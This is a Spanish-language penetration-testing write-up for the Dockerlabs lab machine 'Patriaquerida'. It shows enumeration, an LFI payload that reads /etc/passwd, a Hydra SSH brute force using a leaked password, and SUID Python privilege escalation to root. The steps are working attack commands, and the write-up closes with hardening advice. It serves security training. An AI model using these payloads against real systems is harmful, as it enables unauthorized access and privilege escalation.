# 🛡️ Informe de Pentesting – Máquina: Patriaquerida

## 🌟 Objetivo

Realizar un análisis de seguridad completo sobre la máquina virtual **Patriaquerida**, identificando vulnerabilidades, explotándolas para obtener acceso no autorizado y escalando privilegios hasta obtener el control total del sistema (root).

---

## ⚙️ 1. Despliegue de la Máquina

* Se descargó el archivo `Patriaquerida.zip` desde la página de Dockerlabs.
* Se descomprimió usando:

  ```bash
  unzip Patriaquerida.zip
  ```
* Se desplegó con el script:

  ```bash
  sudo bash auto_deploy.sh Patriaquerida.zip
  ```

![Inicio](/Patriaquerida/Imagenes/Inicio.jpeg)

---

## 🌐 2. Verificación de Conectividad

Se verificó que la máquina estaba activa mediante:

```bash
ping -c4 172.17.0.2
```

![Ping](/Patriaquerida/Imagenes/Ping.jpeg)

---

## 🔍 3. Escaneo de Puertos

Se realizó un escaneo completo de puertos con Nmap:

```bash
sudo nmap -p- -oopen -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

Se encontraron abiertos los puertos **22 (SSH)** y **80 (HTTP)**.

![Puertos](/Patriaquerida/Imagenes/Puertos.jpeg)

Escaneo más profundo:

```bash
extractPorts allPorts.txt
nmap -sC -sV -p 22,80 172.17.0.2 -oN target.txt
```

![Servicios](/Patriaquerida/Imagenes/Servicios.jpeg)

---

## 🔎 4. Análisis del Sitio Web

La página web mostraba el contenido por defecto del servidor Apache.

![Pagina](/Patriaquerida/Imagenes/Pagina.jpeg)

---

## 🪓 5. Fuzzing de Directorios

Se utilizó Gobuster para encontrar recursos ocultos:

```bash
gobuster dir -u http://172.17.0.2 \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -t 20 -add-slash -b 403,404 -x php,html,txt
```

Se encontró `index.php` y desde ahí un archivo oculto `.hidden_pass`.

![Gobuster](/Patriaquerida/Imagenes/Gubuster.jpeg)
![PHP](/Patriaquerida/Imagenes/php.jpeg)

---

## 🔑 6. Obtención de Contraseña

Al acceder a `http://172.17.0.2/.hidden_pass`, se reveló la contraseña `balu`.

![Contraseña](/Patriaquerida/Imagenes/Contraseña.jpeg)

---

## 🛠️ 7. Escaneo con Nikto

Se ejecutó Nikto:

```bash
nikto -h http://172.17.0.2/index.php
```

Se detectó posible vulnerabilidad de **LFI (Local File Inclusion)**.

![Nikto](/Patriaquerida/Imagenes/nikto.jpeg)

---

## 🪛 8. Explotación de LFI

Se utilizó LFI para leer el archivo `/etc/passwd`:

```
http://172.17.0.2/index.php?page=../../../../etc/passwd
```

Esto reveló usuarios del sistema como `pinguino`, `mario` y `root`.

![Informacion](/Patriaquerida/Imagenes/Informacion.jpeg)

---

## 🔓 9. Fuerza Bruta con Hydra

Se crearon dos archivos:

* `usuarios.txt` con nombres de usuario.
* `contraseña.txt` con `balu`.

Ataque con Hydra:

```bash
hydra -L usuarios.txt -P contraseña.txt ssh://172.17.0.2 -t 50
```

Se accedió exitosamente como `pinguino : balu`.

![Hydra](/Patriaquerida/Imagenes/Hydra.jpeg)

---

## 🐧 10. Acceso SSH

Ingreso a la máquina como usuario pinguino:

```bash
ssh pinguino@172.17.0.2
```

![SSH](/Patriaquerida/Imagenes/SSH.jpeg)

---

## 🚀 11. Escalada de Privilegios

### 🔧 1. Búsqueda de archivos SUID

```bash
find / -perm -4000 2>/dev/null
```

Se encontró:

```
/usr/bin/python3.8
```

El bit SUID indica que el archivo se ejecuta con permisos del propietario (root). Verificación:

```bash
ls -l /usr/bin/python3.8
```

Salida:

```
-rwsr-xr-x 1 root root ... /usr/bin/python3.8
```

### 🎡 2. Escalada con Python

Ejecutamos:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### Explicación del código:

* `import os`: importa el módulo del sistema.
* `os.setuid(0)`: cambia el ID del usuario al UID 0 (root).
* `os.system("/bin/bash")`: abre una shell bash.

### 🚫 Riesgo

Permitir que binarios como Python tengan SUID es críticamente peligroso. Un atacante puede ejecutar comandos arbitrarios como root.

### ✅ Confirmación

Comprobación:

```bash
whoami
```

Resultado:

```
root
```

![Escalada](/Patriaquerida/Imagenes/Escalada.jpeg)

---

## ✅ Conclusiones Finales

| Etapa      | Descripción                                               |
| ---------- | --------------------------------------------------------- |
| **Fase 1** | Enumeración de puertos y servicios (Nmap)                 |
| **Fase 2** | Descubrimiento de archivos ocultos y vulnerabilidades web |
| **Fase 3** | Obtención de credenciales válidas (Hydra)                 |
| **Fase 4** | Acceso remoto con SSH                                     |
| **Fase 5** | Escalada de privilegios explotando SUID en Python         |

---

## 🤖 Recomendaciones

* Eliminar archivos con información sensible como `.hidden_pass`.
* Desactivar permisos SUID en binarios como Python.
* Filtrar entradas del usuario para evitar LFI.
* Monitorear intentos de acceso SSH.
* Usar contraseñas seguras y diferentes para cada usuario.
